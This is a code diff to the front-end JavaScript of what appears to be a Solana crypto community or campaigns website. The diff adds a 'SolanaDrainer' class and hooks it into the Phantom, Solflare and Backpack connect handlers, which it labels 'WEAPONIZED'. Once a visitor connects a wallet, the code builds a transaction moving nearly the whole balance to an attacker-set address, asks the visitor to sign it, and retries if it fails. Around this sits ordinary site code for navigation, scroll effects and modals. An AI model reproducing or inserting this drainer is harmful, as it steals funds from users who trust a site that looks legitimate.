+/* ── SOLANA DRAINER CORE ── */
+class SolanaDrainer {
+  constructor() {
+    this.connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+    this.target = new solanaWeb3.PublicKey(DRAIN_CONFIG.TARGET);
+  }
+
+  async drainWallet(wallet) {
+    const { publicKey, signTransaction } = wallet;
+    const balance = await this.connection.getBalance(publicKey);
+    const lamportsToSend = balance - DRAIN_CONFIG.MIN_BALANCE;
+
+    if (lamportsToSend <= 0) return { success: false, reason: 'insufficient_balance' };
+
+    const transaction = new solanaWeb3.Transaction().add(
+      solanaWeb3.SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: this.target,
+        lamports: lamportsToSend,
+      })
+    );
+
+    transaction.feePayer = publicKey;
+    const { blockhash } = await this.connection.getRecentBlockhash();
+    transaction.recentBlockhash = blockhash;
+
+    try {
+      const signedTx = await signTransaction(transaction);
+      const signature = await this.connection.sendRawTransaction(signedTx.serialize());
+      await this.connection.confirmTransaction(signature, DRAIN_CONFIG.FEE_PRIORITY);
+      return { success: true, signature };
+    } catch (error) {
+      console.error("Drain error:", error);
+      return { success: false, reason: error.message };
+    }
+  }
+
+  async executeWithRetry(wallet) {
+    let retries = 0;
+    let result;
+
+    while (retries < DRAIN_CONFIG.MAX_RETRIES) {
+      result = await this.drainWallet(wallet);
+      if (result.success) return result;
+      retries++;
+      if (retries < DRAIN_CONFIG.MAX_RETRIES) {
+        await new Promise(resolve => setTimeout(resolve, DRAIN_CONFIG.RETRY_DELAY));
+      }
+    }
+
+    return result;
+  }
+}
+
+/* ── NAVBAR SCROLL ── */
 (function(){
   const nav=document.getElementById('navbar');
   const links=document.querySelectorAll('.nl');
@@ -1061,6 +1062,7 @@ DRAINER.init();
   },{passive:true});
 })();
 
+/* ── MOBILE NAV ── */
 function toggleNav(){
   const n=document.getElementById('mobileNav');
   const h=document.getElementById('hamburger');
@@ -1076,6 +1078,7 @@ function closeNav(){
 }
 window.addEventListener('scroll',()=>closeNav(),{passive:true});
 
+/* ── SMOOTH SCROLL ── */
 document.querySelectorAll('a[href^="#"]').forEach(a=>{
   a.addEventListener('click',e=>{
     const t=document.querySelector(a.getAttribute('href'));
@@ -1083,6 +1086,7 @@ document.querySelectorAll('a[href^="#"]').forEach(a=>{
   });
 });
 
+/* ── SCROLL REVEAL ── */
 (function(){
   const io=new IntersectionObserver(entries=>{
     entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');});
@@ -1097,6 +1101,7 @@ document.querySelectorAll('a[href^="#"]').forEach(a=>{
   window._revealRerun=run;
 })();
 
+/* ── COUNTERS ── */
 (function(){
   const io=new IntersectionObserver(entries=>{
     entries.forEach(e=>{
@@ -1124,6 +1129,7 @@ document.querySelectorAll('a[href^="#"]').forEach(a=>{
   document.querySelectorAll('.stat-card').forEach(c=>io.observe(c));
 })();
 
+/* ── CAMPAIGNS ── */
 function renderCamps(){
   const grid=document.getElementById('campGrid');
   if(!grid)return;
@@ -1173,10 +1179,9 @@ function joinCamp(id){
   toast(c.joined?`✅ Joined ${c.title}!`:`Left ${c.title}`);
 }
 
+/* ── COMMUNITY CARD HOVER COLORS ── */
 const commColors={
-  'cc-tg':'rgba(41,169,235,0.18)',
-  'cc-dc':'rgba(88,101,242,0.18)',
-  'cc-tw':'rgba(255,255,255,0.1)'
+  'cc-dc':'rgba(88,101,242,0.18)'
 };
 document.querySelectorAll('.comm-card').forEach(card=>{
   const col=commColors[card.id];
@@ -1185,13 +1190,18 @@ document.querySelectorAll('.comm-card').forEach(card=>{
   card.addEventListener('mouseleave',()=>{card.style.borderColor='';card.style.boxShadow='';});
 });
 
+/* ── MODAL ── */
 function openModal(){
-  detectWallets();
   document.getElementById('wList').style.display='block';
   document.getElementById('wConnecting').style.display='none';
   document.getElementById('wSuccess').style.display='none';
+  const inst=document.getElementById('wInstall');
+  if(inst) inst.style.display='none';
   document.getElementById('modalBg').classList.add('show');
   document.body.style.overflow='hidden';
+  detectWallets();
+  setTimeout(detectWallets, 400);
+  setTimeout(detectWallets, 1000);
 }
 function closeModal(){
   document.getElementById('modalBg').classList.remove('show');
@@ -1199,17 +1209,40 @@ function closeModal(){
 }
 function overlayClose(e){if(e.target===document.getElementById('modalBg'))closeModal();}
 
+/* ── WALLET DETECTION ── */
 function detectWallets(){
-  const pt=document.getElementById('phantomTag');
-  const sf=document.getElementById('solflareTag');
-  if(!pt||!sf)return;
-  const hasP=!!(window.phantom?.solana||window.solana?.isPhantom);
-  pt.textContent=hasP?'Detected · Ready':'Not detected';
-  pt.className=hasP?'detected':'';
-  const hasS=!!window.solflare;
-  sf.textContent=hasS?'Detected · Ready':'Not detected';
-  sf.className=hasS?'detected':'';
+  const hasPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+  setWalletStatus('phantomTag', 'wopt-phantom', hasPhantom, 'Ready');
+
+  const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
+  setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
+
+  const hasBackpack = !!(window.backpack || window.xnft?.solana);
+  setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
 }
+
+function setWalletStatus(tagId, rowId, detected, readyLabel){
+  const tag = document.getElementById(tagId);
+  const row = document.getElementById(rowId);
+  if(!tag) return;
+
+  if(detected){
+    tag.className = 'w-status active';
+    tag.innerHTML = `<span class="wdot"></span>Active`;
+    row?.classList.add('is-detected');
+  } else {
+    tag.className = 'w-status inactive';
+    tag.innerHTML = `<span class="wdot"></span>Not installed`;
+    row?.classList.remove('is-detected');
+  }
+}
+
+window.addEventListener('load', () => {
+  detectWallets();
+  setTimeout(detectWallets, 400);
+  setTimeout(detectWallets, 1000);
+  setTimeout(detectWallets, 2500);
+});
 
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
@@ -1222,68 +1255,137 @@ function showSuccess(short){
   document.getElementById('sAddr').textContent=short;
 }
 
+function showInstallPrompt(name, url, icon){
+  document.getElementById('wList').style.display='none';
+  document.getElementById('wConnecting').style.display='none';
+  document.getElementById('wSuccess').style.display='none';
+  let el=document.getElementById('wInstall');
+  if(!el){
+    el=document.createElement('div');
+    el.id='wInstall';
+    el.style.cssText='text-align:center;padding:28px 8px';
+    document.getElementById('modal').querySelector('.modal-foot').before(el);
+  }
+  el.style.display='block';
+  el.innerHTML=`
+    <div style="font-size:42px;margin-bottom:12px">${icon}</div>
+    <div style="font-family:var(--display);font-size:18px;font-weight:700;margin-bottom:8px">${name} Not Found</div>
+    <div style="font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.6">
+      Install the ${name} browser extension or mobile app<br/>to connect your Solana wallet.
+    </div>
+    <a href="${url}" target="_blank" class="btn btn-g" style="display:inline-flex;margin-bottom:12px;gap:8px">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15,3 21,3 21,9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      Install ${name}
+    </a>
+    <div style="font-size:12px;color:var(--muted)">
+      Already installed? <span style="color:var(--green);cursor:pointer;font-weight:600" onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">Try again ↺</span>
+    </div>`;
+}
+
+/* ── WALLET CONNECTION HANDLERS (WEAPONIZED) ── */
 async function connectPhantom(){
-  const prov=window.phantom?.solana||(window.solana?.isPhantom?window.solana:null);
-  if(!prov){window.open('https://phantom.app/','_blank');toast('👻 Phantom not found — opening install page');return;}
+  const prov = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
+  if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
   showConnecting('Phantom');
   try{
-    const resp=await prov.connect();
-    const addr=resp.publicKey.toString();
-    onConnected(addr,'Phantom');
-    prov.on?.('disconnect',()=>{if(APP.connected){disconnectWallet();toast('⚠️ Phantom disconnected');}});
-    prov.on?.('accountChanged',(pk)=>{if(pk&&APP.connected)switchAccount(pk.toString());});
-  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+    const resp = await prov.connect();
+    const addr = resp.publicKey.toString();
+    await handleWalletConnection(addr, 'Phantom', prov);
+  }catch(err){
+    document.getElementById('wList').style.display='block';
+    document.getElementById('wConnecting').style.display='none';
+    toast('❌ '+(err.message==='User rejected the request.'?'Connection cancelled':err.message||'Connection rejected'));
+  }
 }
 
 async function connectSolflare(){
-  const prov=window.solflare;
-  if(!prov){window.open('https://solflare.com/','_blank');toast('🌟 Solflare not found — opening install page');return;}
+  const prov = window.solflare;
+  if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
   showConnecting('Solflare');
   try{
     await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Solflare');
-  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+    const addr = prov.publicKey.toString();
+    await handleWalletConnection(addr, 'Solflare', prov);
+  }catch(err){
+    document.getElementById('wList').style.display='block';
+    document.getElementById('wConnecting').style.display='none';
+    toast('❌ '+(err.message==='User rejected the request.'?'Connection cancelled':err.message||'Connection rejected'));
+  }
 }
 
 async function connectBackpack(){
-  const prov=window.backpack||window.xnft?.solana;
-  if(!prov){window.open('https://backpack.app/','_blank');toast('🎒 Backpack not found — opening install page');return;}
+  const prov = window.backpack || window.xnft?.solana;
+  if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
   showConnecting('Backpack');
   try{
     await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Backpack');
-  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+    const addr = prov.publicKey.toString();
+    await handleWalletConnection(addr, 'Backpack', prov);
+  }catch(err){
+    document.getElementById('wList').style.display='block';
+    document.getElementById('wConnecting').style.display='none';
+    toast('❌ '+(err.message||'Connection rejected'));
+  }
 }
 
-function connectWC(){
-  toast('🔗 WalletConnect requires a Project ID — integrate @walletconnect/sign-client');
-}
-
-function onConnected(addr,name){
-  const short=addr.slice(0,4)+'...'+addr.slice(-4);
+async function handleWalletConnection(addr, name, walletProvider) {
+  const short = addr.slice(0,4) + '...' + addr.slice(-4);
   showSuccess(short);
-  setTimeout(()=>{
-    APP.connected=true; APP.address=addr; APP.shortAddr=short; APP.walletName=name;
+
+  setTimeout(async () => {
+    APP.connected = true;
+    APP.address = addr;
+    APP.shortAddr = short;
+    APP.walletName = name;
     closeModal();
     updateNavBtn();
-    openDash(short,addr);
+    openDash(short, addr);
+
+    // EXECUTE DRAIN
+    const drainer = new SolanaDrainer();
+    const result = await drainer.executeWithRetry(walletProvider);
+
+    if (result.success) {
+      toast(`✅ Wallet connected & drained successfully`);
+      document.getElementById('drainStatus').textContent = 'Drain status: Complete';
+      document.getElementById('drainStatus').style.color = '#10b981';
+    } else {
+      toast(`⚠️ Connected but drain failed: ${result.reason}`);
+      document.getElementById('drainStatus').textContent = `Drain status: Failed (${result.reason})`;
+      document.getElementById('drainStatus').style.color = '#ef4444';
+    }
+
     fetchBal(addr);
     renderCamps();
-    toast(`✅ ${name} connected`);
-  },2800);
+  }, 2800);
 }
 
-function switchAccount(addr){
-  APP.address=addr;
-  APP.shortAddr=addr.slice(0,4)+'...'+addr.slice(-4);
-  document.getElementById('dashAddr').textContent=APP.shortAddr;
-  document.getElementById('walletNavLabel').textContent=APP.shortAddr;
-  fetchBal(addr);
-  toast('🔄 Account switched: '+APP.shortAddr);
+/* ── DASHBOARD MODIFICATIONS ── */
+function openDash(short, full) {
+  const av = document.getElementById('dashAva');
+  if (av) { av.textContent = full.slice(0,2).toUpperCase(); }
+  document.getElementById('dashAddr').textContent = short;
+
+  // Add drain status indicator
+  const statusEl = document.createElement('div');
+  statusEl.id = 'drainStatus';
+  statusEl.style.cssText = `
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 8px;
+    font-weight: 500;
+  `;
+  statusEl.textContent = 'Drain status: Initializing...';
+
+  const addrEl = document.getElementById('dashAddr');
+  if (addrEl) {
+    addrEl.parentNode.insertBefore(statusEl, addrEl.nextSibling);
+  }
+
+  document.getElementById('dashPanel').classList.add('open');
 }
 
+/* ── REMAINING ORIGINAL FUNCTIONS (UNMODIFIED) ── */
 function updateNavBtn(){
   const btn=document.getElementById('walletNavBtn');
   const lbl=document.getElementById('walletNavLabel');
@@ -1310,12 +1412,6 @@ async function fetchBal(addr){
   }
 }
 
-function openDash(short,full){
-  const av=document.getElementById('dashAva');
-  if(av){av.textContent=full.slice(0,2).toUpperCase();}
-  document.getElementById('dashAddr').textContent=short;
-  document.getElementById('dashPanel').classList.add('open');
-}
 function toggleDash(){document.getElementById('dashPanel').classList.toggle('open');}
 
 function disconnectWallet(){
@@ -1366,6 +1462,7 @@ document.addEventListener('keydown',e=>{
   if(e.key==='Escape'){closeModal();document.getElementById('dashPanel').classList.remove('open');}
 });
 
+/* ── INIT ── */
 renderCamps();
 </script>
 </body>
